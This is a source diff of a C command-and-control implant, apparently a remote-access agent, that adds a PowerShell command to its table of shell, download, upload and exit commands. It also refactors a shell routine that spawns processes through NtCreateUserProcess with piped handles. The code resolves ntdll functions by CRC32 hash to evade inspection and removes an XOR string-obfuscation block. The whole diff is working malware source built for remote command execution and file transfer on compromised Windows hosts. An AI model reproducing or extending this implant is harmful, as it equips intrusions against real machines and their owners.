@@ -11,7 +11,7 @@
 
 #include <tchar.h>
 
-#define RVNT_COMMAND_LENGTH 5
+#define RVNT_COMMAND_LENGTH 6
 
 // TODO: ADD COMMANDS
 // TODO: Clean code base, consistent naming
@@ -19,6 +19,7 @@
 
 RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
         { .ID = COMMAND_SHELL,            .Function = CommandShell },
+        { .ID = COMMAND_PWSH,             .Function = CommandShell },
         { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
         { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
         { .ID = COMMAND_EXIT,             .Function = CommandExit },
@@ -133,15 +134,7 @@ VOID CommandShell( PPARSER Parser ){
 #else
     void *p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
-//--------------------------------
-#if CONFIG_OBFUSCATION == TRUE
-    unsigned char s_xk[] = S_XK;
-    unsigned char s_string[] = S_COMMAND_SHELL;
-    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
-#else
-    // _tprintf("Command::Shell\n");
-#endif
-//---------------------------------
+
 #if CONFIG_NATIVE == TRUE
 
     DWORD   Length           = 0;
@@ -163,14 +156,11 @@ VOID CommandShell( PPARSER Parser ){
 
     UNICODE_STRING nt_image_path;
     UNICODE_STRING nt_args;
-    UNICODE_STRING nt_command_line;
 
-    void *p_rtl_init_unicode_string = GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
-    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
+    RtlInitUnicodeString_t p_RtlInitUnicodeString = (RtlInitUnicodeString_t) GetProcAddressByHash(p_ntdll, RtlInitUnicodeString_CRC32B);
 
     // hardcoded test string
     //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
-
 
     // split command and args
     char command_str[MAX_PATH];
@@ -200,18 +190,16 @@ VOID CommandShell( PPARSER Parser ){
     PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);
 
     // unicode str
-    g_rtl_init_unicode_string(&nt_image_path, wide_command);
-    g_rtl_init_unicode_string(&nt_args, wide_args);
-    //g_rtl_init_unicode_string(&nt_command_line, command_line);
+    p_RtlInitUnicodeString(&nt_image_path, wide_command);
+    p_RtlInitUnicodeString(&nt_args, wide_args);
 
     // _tprintf("Command Line:%ls\n", command_line);
 
     PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };
 
     // create process params struct
-    void *p_rtl_create_process_parameters_ex = GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
-    RtlCreateProcessParametersEx_t g_rtl_create_process_parameters_ex = (RtlCreateProcessParametersEx_t) p_rtl_create_process_parameters_ex;
-    g_rtl_create_process_parameters_ex(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
+    RtlCreateProcessParametersEx_t p_RtlCreateProcessParametersEx = (RtlCreateProcessParametersEx_t) GetProcAddressByHash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
+    p_RtlCreateProcessParametersEx(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);
 
     // create info struct
     PS_CREATE_INFO create_info = { 0 };
@@ -232,19 +220,17 @@ VOID CommandShell( PPARSER Parser ){
     proc_params->StandardInput   = handle_array[0];
 
     // allocate process heap
-    void *p_rtl_allocate_heap = GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);
-    RtlAllocateHeap_t g_rtl_allocate_heap = (RtlAllocateHeap_t) p_rtl_allocate_heap;
+    RtlAllocateHeap_t p_RtlAllocateHeap = (RtlAllocateHeap_t) GetProcAddressByHash(p_ntdll, RtlAllocateHeap_CRC32B);
 
     // get heaps
-    void *p_rtl_get_process_heaps = GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
-    RtlGetProcessHeaps_t g_rtl_get_process_heaps = (RtlGetProcessHeaps_t) p_rtl_get_process_heaps;
+    RtlGetProcessHeaps_t p_RtlGetProcessHeaps = (RtlGetProcessHeaps_t) GetProcAddressByHash(p_ntdll, RtlGetProcessHeaps_CRC32B);
 
     // make attributes
     OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
-    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
-    PCLIENT_ID client_id = (PCLIENT_ID)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
-    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
-    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
+    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
+    PCLIENT_ID client_id = (PCLIENT_ID)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
+    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
+    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)p_RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));
 
     attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
     attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
@@ -253,21 +239,22 @@ VOID CommandShell( PPARSER Parser ){
 
     NTSTATUS status;
     HANDLE h_proc, h_thread = NULL;
-    void *p_nt_create_user_process = GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
-    NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
-    if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
+    NtCreateUserProcess_t p_NtCreateUserProcess = (NtCreateUserProcess_t) GetProcAddressByHash(p_ntdll, NtCreateUserProcess_CRC32B);
+
+    if((status = p_NtCreateUserProcess(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
         // _tprintf("PROCESS CREATION FAILED!\n");
         // _tprintf("STATUS:%08x\n", status);
+        __asm("nop;");
     }
-    void *p_rtl_free_heap = GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
-    RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
-    g_rtl_free_heap(RtlProcessHeap(), 0, attrib_list);
-    g_rtl_free_heap(RtlProcessHeap(), 0, sec_img_info);
-    g_rtl_free_heap(RtlProcessHeap(), 0, client_id);
+    RtlFreeHeap_t p_RtlFreeHeap = (RtlFreeHeap_t) GetProcAddressByHash(p_ntdll, RtlFreeHeap_CRC32B);
 
-    void *p_rtl_destroy_process_parameters = GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
-    RtlDestroyProcessParameters_t g_rtl_destroy_process_parameters = (RtlDestroyProcessParameters_t) p_rtl_destroy_process_parameters;
-    g_rtl_destroy_process_parameters(proc_params);
+    p_RtlFreeHeap(RtlProcessHeap(), 0, attrib_list);
+    p_RtlFreeHeap(RtlProcessHeap(), 0, sec_img_info);
+    p_RtlFreeHeap(RtlProcessHeap(), 0, client_id);
+
+    RtlDestroyProcessParameters_t p_RtlDestroyProcessParameters = (RtlDestroyProcessParameters_t) GetProcAddressByHash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
+
+    p_RtlDestroyProcessParameters(proc_params);
 
     CloseHandle( hStdOutPipeWrite );
     CloseHandle( hStdInPipeRead );
